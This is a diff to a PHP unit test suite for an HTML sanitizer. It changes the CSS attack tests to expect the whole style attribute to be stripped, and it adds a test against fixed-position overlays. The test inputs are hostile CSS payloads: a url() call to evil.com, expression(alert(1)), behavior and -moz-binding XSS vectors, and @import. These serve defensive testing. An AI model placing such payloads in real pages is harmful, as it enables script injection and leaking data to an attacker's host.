@@ -74,22 +74,29 @@ class HtmlSanitizerTest extends TestCase
     public function test_css_url_exfiltration_blocked(): void
     {
         $out = $this->s->sanitize('<p style="background:url(https://evil.com/?c=x)">text</p>');
-        $this->assertStringNotContainsString('url(', $out);
-        $this->assertStringContainsString('BLOCKED(', $out);
+        $this->assertStringNotContainsString('style=', $out);
+        $this->assertStringContainsString('text', $out);
     }
 
     public function test_css_expression_blocked(): void
     {
         $out = $this->s->sanitize('<p style="width:expression(alert(1))">text</p>');
-        $this->assertStringNotContainsString('expression(', $out);
-        $this->assertStringContainsString('BLOCKED(', $out);
+        $this->assertStringNotContainsString('style=', $out);
+        $this->assertStringContainsString('text', $out);
     }
 
     public function test_css_behavior_blocked(): void
     {
         $out = $this->s->sanitize('<p style="behavior:url(evil.htc)">text</p>');
-        $this->assertStringNotContainsString('behavior(', $out);
-        $this->assertStringContainsString('BLOCKED(', $out);
+        $this->assertStringNotContainsString('style=', $out);
+        $this->assertStringContainsString('text', $out);
+    }
+
+    public function test_css_position_fixed_blocked(): void
+    {
+        $out = $this->s->sanitize('<div style="position:fixed;top:0;width:100%">overlay</div>');
+        $this->assertStringNotContainsString('style=', $out);
+        $this->assertStringContainsString('overlay', $out);
     }
 
     public function test_disallowed_attribute_stripped(): void
@@ -129,12 +136,12 @@ class HtmlSanitizerTest extends TestCase
     public function test_css_moz_binding_blocked(): void
     {
         $out = $this->s->sanitize('<p style="-moz-binding:url(evil.xml#xss)">text</p>');
-        $this->assertStringNotContainsString('-moz-binding', $out);
+        $this->assertStringNotContainsString('style=', $out);
     }
 
     public function test_css_import_in_style_blocked(): void
     {
         $out = $this->s->sanitize('<p style="@import url(evil.css)">text</p>');
-        $this->assertStringNotContainsString('@import', $out);
+        $this->assertStringNotContainsString('style=', $out);
     }
 }
